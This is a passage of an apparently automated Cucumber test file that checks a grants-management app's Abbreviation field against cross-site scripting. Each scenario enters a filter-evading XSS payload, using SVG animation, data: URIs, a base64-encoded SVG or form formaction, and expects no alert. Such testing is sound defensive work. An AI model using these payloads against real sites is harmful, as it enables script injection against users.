      | <svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301012 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                     | Field                |
      | <svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301014 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                 | Field                |
      | <svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301016 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                 | Field                |
      | <script src="data:text/javascript,alert(1)"></script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301017 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                | Field                |
      | <svg><script href="data:text/javascript,alert(1)" /> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301018 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                             | Field                |
      | <svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301019 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                    | Field                |
      | <script>import('data:text/javascript,alert(1)')</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301020 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                           | Field                |
      | <base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301022 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                    | Field                |
      | <math><x href="javascript:alert(1)">blah | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301024 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                            | Field                |
      | <form><button formaction=javascript:alert(1)>XSS | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301026 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                              | Field                |
      | <form><input type=submit formaction=javascript:alert(1) value=XSS> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301027 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <form action=javascript:alert(1)><input type=submit value=XSS> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301030 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                          | Field                |
      | <form action=javascript:alert(1)><input type=submit value=XSS> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301036 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                      | Field                |
      | <a href="javascript://%0aalert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301027 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                                                                                          | Field                |
      | <svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301039 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                 | Field                |
      | <svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301042 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                        | Field                |
      | <svg><animate xlink:href="#x" attributeName="href" values="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" /><use id=x /> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
     #   | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301047 
